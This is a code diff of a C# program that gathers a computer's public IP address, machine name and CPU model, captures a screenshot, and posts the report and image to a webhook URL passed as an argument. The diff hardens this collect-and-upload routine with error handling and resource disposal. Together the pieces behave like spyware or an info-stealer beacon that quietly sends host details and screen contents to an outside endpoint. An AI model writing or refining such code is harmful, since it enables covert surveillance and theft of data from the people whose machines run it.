@@ -16,10 +16,10 @@ public class Program
             string webhook = args[0];
             var client = new HttpClient();
 
-            // 1. Sběr systémových informací
-            string ip = client.GetStringAsync("https://ifconfig.me/ip").GetAwaiter().GetResult().Trim();
-            string pcName = Environment.MachineName;
+            string ip = "N/A";
+            try { ip = client.GetStringAsync("https://ifconfig.me/ip").GetAwaiter().GetResult().Trim(); } catch {}
             
+            string pcName = Environment.MachineName;
             string cpu = "";
             using (var s = new ManagementObjectSearcher("select Name from Win32_Processor"))
                 foreach (var obj in s.Get()) cpu = obj["Name"].ToString();
@@ -52,15 +52,15 @@ public class Program
                     bitmap.Save(ms, ImageFormat.Png);
                     byte[] byteImage = ms.ToArray();
 
-                    var form = new MultipartFormDataContent();
-                    
-                    form.Add(new StringContent(report), "content");
-                    
-                    var imageContent = new ByteArrayContent(byteImage);
-                    imageContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/png");
-                    form.Add(imageContent, "file", "screenshot.png");
+                    using (var form = new MultipartFormDataContent())
+                    {
+                        form.Add(new StringContent(report, Encoding.UTF8), "content");
+                        var imageContent = new ByteArrayContent(byteImage);
+                        imageContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/png");
+                        form.Add(imageContent, "file", "screenshot.png");
 
-                    client.PostAsync(webhook, form).GetAwaiter().GetResult();
+                        client.PostAsync(webhook, form).GetAwaiter().GetResult();
+                    }
                 }
             }
         }
